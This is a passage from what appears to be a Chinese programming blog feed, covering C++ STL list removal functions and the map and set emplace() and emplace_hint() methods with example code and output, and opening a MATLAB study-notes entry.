class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span> <span class="hljs-number">5</span><br></code></pre></div></td></tr></table></figure><p>erase() 成员函数是按照被删除元素所在的位置来执行删除操作，如果想根据元素的值来执行删除操作，可以使用 remove() 成员函数。例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">char</span>&gt;values&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>&#125;;<br>    values.remove(<span class="hljs-string">&#x27;c&#x27;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> begin = values.begin(); begin != values.end(); ++begin)<br>    &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *begin &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>a b d<br></code></pre></div></td></tr></table></figure><p>unique() 函数也有以下 2 种语法格式：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unique</span><span class="hljs-params">()</span></span><br>void unique（BinaryPredicate）//传入一个二元谓词函数<br></code></pre></div></td></tr></table></figure><p>以上 2 种格式都能实现去除 list 容器中相邻重复的元素，仅保留一份。但第 2 种格式的优势在于，我们能自定义去重的规则，例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">//二元谓词函数</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">demo</span><span class="hljs-params">(<span class="hljs-keyword">double</span> first, <span class="hljs-keyword">double</span> second)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>(first) == <span class="hljs-keyword">int</span>(second));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">double</span>&gt; mylist&#123; <span class="hljs-number">1</span>,<span class="hljs-number">1.2</span>,<span class="hljs-number">1.2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">4.5</span>,<span class="hljs-number">4.6</span> &#125;;<br>    <span class="hljs-comment">//删除相邻重复的元素，仅保留一份</span><br>    mylist.unique();<span class="hljs-comment">//&#123;1, 1.2, 3, 4, 4.5, 4.6&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = mylist.begin(); it != mylist.end(); ++it)<br>        <span class="hljs-built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//demo 为二元谓词函数，是我们自定义的去重规则</span><br>    mylist.unique(demo);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = mylist.begin(); it != mylist.end(); ++it)<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span> <span class="hljs-number">1.2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">4.5</span> <span class="hljs-number">4.6</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>注意，除了以上一定谓词函数的方式，还可以使用 lamba表达式以及函数对象的方式定义。<br>通过调用无参的 unique()，仅能删除相邻重复（也就是相等）的元素，而通过我们自定义去重的规则，可以更好的满足在不同场景下去重的需求。<br>除此之外，通过将自定义的谓词函数（不限定参数个数）传给 remove_if() 成员函数，list 容器中能使谓词函数成立的元素都会被删除。例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;list&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;<span class="hljs-keyword">int</span>&gt; mylist&#123; <span class="hljs-number">15</span>, <span class="hljs-number">36</span>, <span class="hljs-number">7</span>, <span class="hljs-number">17</span>, <span class="hljs-number">20</span>, <span class="hljs-number">39</span>, <span class="hljs-number">4</span>, <span class="hljs-number">1</span> &#125;;<br>    <span class="hljs-comment">//删除 mylist 容器中能够使 lamba 表达式成立的所有元素。</span><br>    mylist.remove_if([](<span class="hljs-keyword">int</span> value) &#123;<span class="hljs-keyword">return</span> (value &lt; <span class="hljs-number">10</span>); &#125;); <span class="hljs-comment">//&#123;15 36 17 20 39&#125;</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = mylist.begin(); it != mylist.end(); ++it)<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; *it;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">15</span> <span class="hljs-number">36</span> <span class="hljs-number">17</span> <span class="hljs-number">20</span> <span class="hljs-number">39</span><br></code></pre></div></td></tr></table></figure><hr><h3 id="五-map-容器插入键值的两种函数"><a href="#五-map-容器插入键值的两种函数" class="headerlink" title="五.map 容器插入键值的两种函数"></a>五.map 容器插入键值的两种函数</h3><p>map中除了insert()方法可以插入外。C++ STL map 类模板中还提供了 emplace() 和 emplace_hint() 成员函数，也可以实现向 map 容器中插入新的键值对。<br>实现相同的插入操作，无论是用 emplace() 还是 emplace_hont()，都比 insert() 方法的效率高。</p><p>和 insert() 方法相比，emplace() 和 emplace_hint() 方法的使用要简单很多，因为它们各自只有一种语法格式。其中，emplace() 方法的语法格式如下：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;class... Args&gt;<br>  pair&lt;iterator,bool&gt; emplace (Args&amp;&amp;... args);<br></code></pre></div></td></tr></table></figure><p>参数 (Args&amp;&amp;… args) 指的是，这里只需要将创建新键值对所需的数据作为参数直接传入即可，此方法可以自行利用这些数据构建出指定的键值对。另外，该方法的返回值也是一个 pair 对象，其中 pair.first 为一个迭代器，pair.second 为一个 bool 类型变量：</p><ul><li>当该方法将键值对成功插入到 map 容器中时，其返回的迭代器指向该新插入的键值对，同时 bool 变量的值为 true；</li><li>当插入失败时，则表明 map 容器中存在具有相同键的键值对，此时返回的迭代器指向此具有相同键的键值对，同时 bool 变量的值为 false。</li></ul><p>emplace() 方法的具体用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;  //map</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt; //string</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//创建并初始化 map 容器</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;mymap;<br>    <span class="hljs-comment">//插入键值对</span><br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator, <span class="hljs-keyword">bool</span>&gt; ret = mymap.emplace(<span class="hljs-string">&quot;STL教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;1、ret.iter = &lt;&#123;&quot;</span> &lt;&lt; ret.first-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ret.first-&gt;second &lt;&lt; <span class="hljs-string">&quot;&#125;, &quot;</span> &lt;&lt; ret.second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//插入新键值对</span><br>    ret = mymap.emplace(<span class="hljs-string">&quot;C语言教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;2、ret.iter = &lt;&#123;&quot;</span> &lt;&lt; ret.first-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ret.first-&gt;second &lt;&lt; <span class="hljs-string">&quot;&#125;, &quot;</span> &lt;&lt; ret.second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//失败插入的样例</span><br>    ret = mymap.emplace(<span class="hljs-string">&quot;STL教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;3、ret.iter = &lt;&#123;&quot;</span> &lt;&lt; ret.first-&gt;first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ret.first-&gt;second &lt;&lt; <span class="hljs-string">&quot;&#125;, &quot;</span> &lt;&lt; ret.second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">1</span>、ret.iter = &lt;&#123;STL教程, https:<span class="hljs-comment">//lichengloong.com/&#125;, 1&gt;</span><br><span class="hljs-number">2</span>、ret.iter = &lt;&#123;C语言教程, https:<span class="hljs-comment">//lichengloong.com/&#125;, 1&gt;</span><br><span class="hljs-number">3</span>、ret.iter = &lt;&#123;STL教程, https:<span class="hljs-comment">//lichengloong.com/&#125;, 0&gt;</span><br></code></pre></div></td></tr></table></figure><p>程序中共执行了 3 次向 map 容器插入键值对的操作，其中前 2 次都成功了，第 3 次由于要插入的键值对的键和 map 容器中已存在的键值对的键相同，因此插入失败。</p><p>emplace_hint() 方法的功能和 emplace() 类似，其语法格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;class... Args&gt;<br>  <span class="hljs-function">iterator <span class="hljs-title">emplace_hint</span> <span class="hljs-params">(const_iterator position, Args&amp;&amp;... args)</span></span>;<br></code></pre></div></td></tr></table></figure><p>显然和 emplace() 语法格式相比，有以下 2 点不同：</p><blockquote><p>1.该方法不仅要传入创建键值对所需要的数据，还需要传入一个迭代器作为第一个参数，指明要插入的位置（新键值对键会插入到该迭代器指向的键值对的前面）；<br>2.该方法的返回值是一个迭代器，而不再是 pair 对象。当成功插入新键值对时，返回的迭代器指向新插入的键值对；反之，如果插入失败，则表明 map 容器中存有相同键的键值对，返回的迭代器就指向这个键值对。</p></blockquote><p>emplace_hint() 方法的用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;map&gt;  //map</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt; //string</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//创建并初始化 map 容器</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;mymap;<br>    <span class="hljs-comment">//指定在 map 容器插入键值对</span><br>    <span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator iter = mymap.emplace_hint(mymap.begin(),<span class="hljs-string">&quot;STL教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    iter = mymap.emplace_hint(mymap.begin(), <span class="hljs-string">&quot;C语言教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-comment">//插入失败样例</span><br>    iter = mymap.emplace_hint(mymap.begin(), <span class="hljs-string">&quot;STL教程&quot;</span>, <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; iter-&gt;first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; iter-&gt;second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>STL教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>C语言教程 https:<span class="hljs-comment">//lichengloong.com/</span><br>STL教程 https:<span class="hljs-comment">//lichengloong.com/</span><br></code></pre></div></td></tr></table></figure><p>和 insert() 方法一样，虽然 emplace_hint() 方法指定了插入键值对的位置，但 map 容器为了保持存储键值对的有序状态，可能会移动其位置。</p><hr><h3 id="六-set-容器添加元素的两种方法"><a href="#六-set-容器添加元素的两种方法" class="headerlink" title="六.set 容器添加元素的两种方法"></a>六.set 容器添加元素的两种方法</h3><p>set 类模板提供的所有成员方法中，能实现向指定 set 容器中添加新元素的，只有 3 个成员方法，分别为 insert()、emplace() 和 emplace_hint()。其中 insert() 成员方法的用法比较常规，这里就不再记录具体用法了。</p><p>emplace() 和 emplace_hint() 是 C++ 11 标准加入到 set 类模板中的，相比具有同样功能的 insert() 方法，完成同样的任务，emplace() 和 emplace_hint() 的效率会更高。</p><h4 id="emplace-函数-1"><a href="#emplace-函数-1" class="headerlink" title="emplace()函数"></a>emplace()函数</h4><p>emplace() 方法的语法格式：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;class... Args&gt;<br>  pair&lt;iterator,bool&gt; emplace (Args&amp;&amp;... args);<br></code></pre></div></td></tr></table></figure><p>其中，参数 (Args&amp;&amp;… args) 指的是，只需要传入构建新元素所需的数据即可，该方法可以自行利用这些数据构建出要添加的元素。比如，若 set 容器中存储的元素类型为自定义的结构体或者类，则在使用 emplace() 方法向容器中添加新元素时，构造新结构体变量（或者类对象）需要多少个数据，就需要为该方法传入相应个数的数据。</p><p>该方法的返回值类型为 pair 类型，其包含 2 个元素，一个迭代器和一个 bool 值：</p><blockquote><ul><li>当该方法将目标元素成功添加到 set 容器中时，其返回的迭代器指向新插入的元素，同时 bool 值为 true；</li><li>当添加失败时，则表明原 set 容器中已存在相同值的元素，此时返回的迭代器指向容器中具有相同键的这个元素，同时 bool 值为 false。</li></ul></blockquote><p>演示 emplace() 方法的具体用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建并初始化 set 容器</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>&lt;<span class="hljs-built_in">string</span>&gt;myset;<br>    <span class="hljs-comment">//向 myset 容器中添加元素</span><br>    <span class="hljs-built_in">pair</span>&lt;<span class="hljs-built_in">set</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;::iterator, <span class="hljs-keyword">bool</span>&gt; ret = myset.emplace(<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;myset size = &quot;</span> &lt;&lt; myset.size() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;ret.iter = &lt;&quot;</span> &lt;&lt; *(ret.first) &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ret.second &lt;&lt; <span class="hljs-string">&quot;&gt;&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>myset size = <span class="hljs-number">1</span><br>ret.iter = &lt;https:<span class="hljs-comment">//lichengloong.com/, 1&gt;</span><br></code></pre></div></td></tr></table></figure><p>从执行结果可以看出，通过调用 emplace() 方法，成功向空 myset 容器中添加了一个元素，并且该方法的返回值中就包含指向新添加元素的迭代器。</p><h4 id="emplace-hint-函数"><a href="#emplace-hint-函数" class="headerlink" title="emplace_hint()函数"></a>emplace_hint()函数</h4><p>emplace_hint() 方法的功能和 emplace() 类似，其语法格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;class... Args&gt;<br>  <span class="hljs-function">iterator <span class="hljs-title">emplace_hint</span> <span class="hljs-params">(const_iterator position, Args&amp;&amp;... args)</span></span>;<br></code></pre></div></td></tr></table></figure><p>和 emplace() 方法相比，有以下 2 点不同：</p><blockquote><ul><li>该方法需要额外传入一个迭代器，用来指明新元素添加到 set 容器的具体位置（新元素会添加到该迭代器指向元素的前面）；</li><li>返回值是一个迭代器，而不再是 pair 对象。当成功添加元素时，返回的迭代器指向新添加的元素；反之，如果添加失败，则迭代器就指向 set 容器和要添加元素的值相同的元素。</li></ul></blockquote><p>演示 emplace_hint() 方法的用法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-comment">//创建并初始化 set 容器</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">set</span>&lt;<span class="hljs-built_in">string</span>&gt;myset;<br>    <span class="hljs-comment">//在 set 容器的指定位置添加键值对</span><br>    <span class="hljs-built_in">set</span>&lt;<span class="hljs-built_in">string</span>&gt;::iterator iter = myset.emplace_hint(myset.begin(), <span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>);<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;myset size = &quot;</span> &lt;&lt; myset.size() &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//输出结果</span><br>myset size = <span class="hljs-number">1</span><br>https:<span class="hljs-comment">//lichengloong.com/</span><br></code></pre></div></td></tr></table></figure><p>需要注意的是，和 insert() 方法一样，虽然 emplace_hint() 方法中指定了添加新元素的位置，但 set 容器为了保持数据的有序状态，可能会移动其位置。</p><p>至于比 insert() 执行效率高的原因，可参照 map 容器 emplace() 和 emplace_hint() 比 insert() 效率高的原因，它们是完全一样的。</p>]]></content>
    
    
    <categories>
      
      <category>ACM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（二）</title>
    <link href="/2021/05/28/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/28/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-MATLAB-基本用法"><a href="#1-MATLAB-基本用法" class="headerlink" title="1.MATLAB 基本用法"></a>1.MATLAB 基本用法</h2><p>MATLAB 是一种解释型的环境。也就是说，只要给MATLAB一个命令，它就会马上开始执行。MATLAB 的程序文件是扩展名为.m的 M 文件，M 文件有脚本 M 文件和函数 M 文件两种。脚本 M 文件是比较简单的程序文件，仅是一串按用户意图排列而成的 MATLAB 命令集合。</p><p>如：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-number">5</span>+<span class="hljs-number">5</span> <span class="hljs-comment">%返回10</span><br><span class="hljs-number">3</span>^<span class="hljs-number">2</span> <span class="hljs-comment">%返回9</span><br></code></pre></div></td></tr></table></figure><p>MATLAB 提供了一些特殊的一些数学符号的表达。Nan 代表“不是一个数字”。</p><h3 id="1-1-退出"><a href="#1-1-退出" class="headerlink" title="1.1 退出"></a>1.1 退出</h3><p>想要退出 MATLAB 环境，可以使用以下任何一种方式：</p><blockquote><ol><li>在 MATLAB 的命令行窗口输入exit命令。</li></ol></blockquote><blockquote><ol start="2"><li>在 MATLAB 的命令行窗口输入quit命令。</li></ol></blockquote><blockquote><ol start="3"><li>直接单击 MATLAB 直接面右上角的“关闭”按钮。</li></ol></blockquote><h3 id="1-2-常用的运算符和特殊字符"><a href="#1-2-常用的运算符和特殊字符" class="headerlink" title="1.2 常用的运算符和特殊字符"></a>1.2 常用的运算符和特殊字符</h3><p>MATLAB常用的运算符和特殊字符。</p><table><thead><tr><th align="center">运算符</th><th align="center">目的</th></tr></thead><tbody><tr><td 